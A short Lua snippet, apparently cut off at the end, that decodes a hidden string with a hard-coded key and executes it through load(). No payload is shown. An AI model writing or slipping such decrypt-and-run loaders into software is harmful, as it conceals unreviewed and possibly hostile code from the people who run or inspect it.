
local function decrypt_string(str, key)
    local result = ""
    for i = 1, #str do
        local byte = string.byte(str, i)
        local key_byte = string.byte(key, ((i-1) % #key) + 1)
        result = result .. string.char((byte - key_byte) % 256)
    end
    return result
end

local _key = "xpjlTSYw4K4wKtFc"

local success, result = pcall(function()
    local decoded = decrypt_string(_code, _key)
    return load(decoded)
end)

if success and result then
    result()
